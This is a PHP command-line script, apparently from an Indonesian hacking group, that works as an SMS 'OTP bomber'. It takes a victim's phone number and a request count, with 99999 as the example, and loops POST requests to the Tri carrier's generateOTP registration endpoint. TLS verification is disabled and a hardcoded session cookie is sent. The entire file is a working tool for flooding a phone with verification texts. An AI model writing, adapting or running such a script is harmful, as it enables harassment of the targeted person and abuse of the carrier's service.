<?php
/*
C0ded by SugiCode <3
*/
function banner(){
system('cls') or system('clear');
print "============================================\n";
print " ____  __  ____      ____  ____   __   _  _ \n";
print "/ ___)(  )/ ___) ___(_  _)(  __) / _\ ( \/ )\n";
print "\___ \ )( \___ \(___) )(   ) _) /    \/ \/ \ \n";
print "(____/(__)(____/     (__) (____)\_/\_/\_)(_/\n";
print "============================================\n";
print "  Thx For SIS-TEAM And All Member SIS-TEAM  \n";
print "============================================\n";
}
if (empty($argv[1]) or empty($argv[2])) {
banner();
echo "Usage : php ".$argv[0]." phone-number jumlah-request\n";
echo "Example : ";
echo "php ".$argv[0]." 0898xxxxxxxx 99999\n";
}
else {
banner();
$request = $argv[2];
for ($x=1; $x<=$request; $x++) {
sleep(2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://registrasi.tri.co.id/daftar/generateOTP");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=".$argv[1]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Cookie: PHPSESSID=5noisam2cugiq25l6374u79975',
'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36',
'Accept: application/json, text/javascript, */*; q=0.01'
));
$server_output = curl_exec ($ch);
curl_close ($ch);
$server_output = json_decode($server_output, TRUE);
if ($server_output['status'] == "success") {
echo "[".$x."/".$request."][".$argv[1]."] Success\n";
}
else {
echo "[".$x."/".$request."][".$argv[1]."] Failed!\n";
}
}
}
?>